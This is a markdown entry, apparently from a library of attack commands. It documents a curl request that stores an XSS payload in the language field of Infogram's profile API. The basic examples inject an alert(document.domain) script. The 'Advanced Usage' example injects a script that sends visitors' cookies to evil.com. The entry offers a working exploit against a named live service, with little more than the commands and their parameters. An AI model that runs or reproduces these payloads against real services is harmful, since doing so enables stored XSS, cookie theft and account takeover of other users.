---
id: cmd-update-infogram-xss
data: >-
  curl -X PUT https://infogram.com/api/users/me -H "Content-Type:
  application/x-www-form-urlencoded" -d
  "first_name=name&last_name=name&username=&confirm_password=password&language=></script><img
  src=x onerror=alert(document.domain)>;"
tags:
  - xss
  - http
  - curl
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T00:11:09.742Z'
verified: false
validated: true
submitted: true
---
# update-infogram-profile-xss

## Command

```bash
curl -X PUT https://infogram.com/api/users/me -H "Content-Type: application/x-www-form-urlencoded" -d "first_name=name&last_name=name&username=&confirm_password=password&language=></script><img src=x onerror=alert(document.domain)>;"
```

## Description

This command sends an HTTP PUT request to the Infogram profile API, injecting a stored XSS payload into the language parameter to exploit lack of sanitization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PUT` | Specifies the HTTP method for profile update | Yes |
| `-H "Content-Type: ..."` | Sets form-encoded content type for the request body | Yes |
| `-d "..."` | Form data including payload; customize fields as needed | Yes |
| `language=...` | The XSS payload string | Yes |

## Examples

### Basic Usage

```bash
curl -X PUT https://infogram.com/api/users/me -H "Content-Type: application/x-www-form-urlencoded" -d "language=></script><img src=x onerror=alert(document.domain)>;"
```

### Advanced Usage

```bash
curl -X PUT https://infogram.com/api/users/me -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/x-www-form-urlencoded" -d "first_name=attacker&language=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
```

## Expected Output

HTTP 200 OK with JSON like {"status": "success", "user": {...}}, indicating the profile was updated and payload stored. No errors if authentication is valid.

## Related

- [[Related Procedure|procedures/Inject-XSS-Payload-into-Infogram-Profile]]
